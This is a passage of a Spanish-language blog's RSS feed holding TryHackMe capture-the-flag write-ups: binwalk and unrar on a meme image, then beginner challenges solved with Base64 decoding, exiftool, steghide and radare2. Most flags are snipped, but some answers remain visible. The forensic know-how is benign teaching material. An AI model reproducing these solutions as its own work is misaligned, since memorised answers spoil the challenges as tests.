WARNING: Extractor.execute failed to run external extractor &lt;span class=&#34;s1&#34;&gt;&amp;#39;unrar -x &amp;#39;&lt;/span&gt;%e&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Errno 2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No such file or directory: &lt;span class=&#34;s1&#34;&gt;&amp;#39;unrar&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;unrar&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;unrar -x &amp;#39;&lt;/span&gt;%e&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; might not be installed correctly
&lt;span class=&#34;m&#34;&gt;74407&lt;/span&gt;         0x122A7         RAR archive data, version 5.x
&lt;span class=&#34;m&#34;&gt;74478&lt;/span&gt;         0x122EE         PNG image, &lt;span class=&#34;m&#34;&gt;147&lt;/span&gt; x 37, 8-bit/color RGBA, non-interlaced
&lt;span class=&#34;m&#34;&gt;74629&lt;/span&gt;         0x12385         Zlib compressed data, default compression
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Extraemos el archivo rar.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  _meme.jpg.extracted unrar e 122A7.rar

UNRAR 5.50 freeware      Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 1993-2017 Alexander Roshal


Extracting from 122A7.rar

Extracting  hackerchat.png                                            OK 
All OK
➜  _meme.jpg.extracted ls
122A7.rar  &lt;span class=&#34;m&#34;&gt;12385&lt;/span&gt;  12385.zlib  hackerchat.png
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos Strings para ver nuestra flag en la nueva imagen.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  _meme.jpg.extracted strings hackerchat.png&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tail
&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SQP
S~j@6h
vA&lt;span class=&#34;o&#34;&gt;}=&lt;/span&gt;
*s&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;__
@9Xs
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;@84
2&lt;span class=&#34;nv&#34;&gt;$Es&lt;/span&gt;
i2Mc
IEND
&lt;span class=&#34;s2&#34;&gt;&amp;#34;AHH_[... snip ...]_ME!&amp;#34;&lt;/span&gt; 
➜  _meme.jpg.extracted
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/c4ptur3th3fl4g/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/c4ptur3th3fl4g/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>challenge</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - CTF collection Vol.1</title>
        <link>https://sckull.github.io/posts/ctf_collection_vol1/</link>
        <pubDate>Wed, 12 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 12 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/ctf_collection_vol1/</guid>
        <description>CTF collection Vol.1 es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.</description>
        <content:encoded>&lt;p&gt;CTF collection Vol.1 es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;CTF collection Vol.1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Sharpening up your CTF skill with the collection. The first volume is designed for beginner.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;3173&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DesKel&#34;&gt;Deskel&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;what-does-the-base-said&#34;&gt;What does the base said?&lt;/h3&gt;
&lt;p&gt;Can you decode the following?&lt;br /&gt;
&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Base64
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;meta-meta&#34;&gt;Meta meta&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  ctf_collection_vol1 exiftool Findme.jpg 
ExifTool Version Number         : 10.80
File Name                       : Findme.jpg
Directory                       : .
File Size                       : &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; kB
File Modification Date/Time     : 2020:02:12 17:29:21-06:00
File Access Date/Time           : 2020:02:12 17:29:54-06:00
File Inode Change Date/Time     : 2020:02:12 17:29:49-06:00
File Permissions                : rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : &lt;span class=&#34;m&#34;&gt;96&lt;/span&gt;
Y Resolution                    : &lt;span class=&#34;m&#34;&gt;96&lt;/span&gt;
Exif Byte Order                 : Big-endian &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Motorola, MM&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Exif Version                    : &lt;span class=&#34;m&#34;&gt;0231&lt;/span&gt;
Components Configuration        : Y, Cb, Cr, -
Flashpix Version                : &lt;span class=&#34;m&#34;&gt;0100&lt;/span&gt;
Owner Name                      : THM&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
Comment                         : CREATOR: gd-jpeg v1.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;using IJG JPEG v62&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;quality&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 60.
Image Width                     : &lt;span class=&#34;m&#34;&gt;800&lt;/span&gt;
Image Height                    : &lt;span class=&#34;m&#34;&gt;480&lt;/span&gt;
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
Color Components                : &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
Y Cb Cr Sub Sampling            : YCbCr4:2:0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Image Size                      : 800x480
Megapixels                      : 0.384
➜  ctf_collection_vol1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;mon-are-we-going-to-be-okay&#34;&gt;Mon, are we going to be okay? &lt;/h3&gt;
&lt;p&gt;Something is hiding. That&amp;rsquo;s all you need to know.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  ctf_collection_vol1 steghide info Extinction.jpg 
&lt;span class=&#34;s2&#34;&gt;&amp;#34;Extinction.jpg&amp;#34;&lt;/span&gt;:
  format: jpeg
  capacity: 1.3 KB
Try to get information about embedded data ? &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;y/n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 

➜  ctf_collection_vol1 steghide info Extinction.jpg
&lt;span class=&#34;s2&#34;&gt;&amp;#34;Extinction.jpg&amp;#34;&lt;/span&gt;:
  format: jpeg
  capacity: 1.3 KB
Try to get information about embedded data ? &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;y/n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; y
Enter passphrase: 
  embedded file &lt;span class=&#34;s2&#34;&gt;&amp;#34;Final_message.txt&amp;#34;&lt;/span&gt;:
    size: 79.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
➜  ctf_collection_vol1 steghide extract -sf Extinction.jpg 
Enter passphrase: 
wrote extracted data to &lt;span class=&#34;s2&#34;&gt;&amp;#34;Final_message.txt&amp;#34;&lt;/span&gt;.
➜  ctf_collection_vol1 cat Final_message.txt 
It going to be over soon. Sleep my child.

THM&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
➜  ctf_collection_vol1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;ermmagick&#34;&gt;Erm&amp;hellip;&amp;hellip;Magick&lt;/h3&gt;
&lt;p&gt;Huh, where is the flag?&lt;br /&gt;
&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_173302.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;qrrrrr&#34;&gt;QRrrrr&lt;/h3&gt;
&lt;p&gt;Such technology is quite reliable.&lt;br /&gt;
&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_173620.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;reverse-it-or-read-it&#34;&gt;Reverse it or read it?&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  ctf_collection_vol1 r2 hello.hello   
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x00001060&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; aaa
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Analyze all flags starting with sym. and entry0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;aa&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Analyze len bytes of instructions &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; references &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;aar&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Analyze &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; calls &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;aac&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Use -AA or aaaa to perform additional experimental analysis.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Constructing a &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; name &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; fcn.* and sym.func.* functions &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;aan&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x00001060&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; afl
0x00001000    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;           sym._init
0x00001030    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;            sym.imp.puts
0x00001040    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;            sym.imp.printf
0x00001050    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;            sub.__cxa_finalize_248_50
0x00001060    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;43&lt;/span&gt;           entry0
0x00001090    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt;           sym.deregister_tm_clones
0x000010c0    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;           sym.register_tm_clones
0x00001100    &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;49&lt;/span&gt;           sym.__do_global_dtors_aux
0x00001140    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;            entry1.init
0x00001145    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;           sym.skip
0x0000115d    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;           sym.main
0x00001180    &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;93&lt;/span&gt;           sym.__libc_csu_init
0x000011e0    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;            sym.__libc_csu_fini
0x000011e4    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;            sym._fini
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x00001060&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; pdf @sym.skip
/ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;fcn&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; sym.skip &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;                                                                                                         
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   sym.skip &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                                                                                                            
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00001145      &lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;             push rbp                                                                         
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00001146      4889e5         mov rbp, rsp                                                                     
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00001149      488d3db80e00.  lea rdi, qword str.THM_345y_f1nd_345y_60 &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0x2008 &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;THM{... snip ...}&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00001150      b800000000     mov eax, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x00001155      e8e6feffff     call sym.imp.printf         &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; int printf&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *format&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x0000115a      &lt;span class=&#34;m&#34;&gt;90&lt;/span&gt;             nop
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           0x0000115b      5d             pop rbp
&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;          0x0000115c      c3             ret
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x00001060&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;another-decoding-stuff&#34;&gt;Another decoding stuff&lt;/h3&gt;
&lt;p&gt;Can you decode it?&lt;br /&gt;
&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
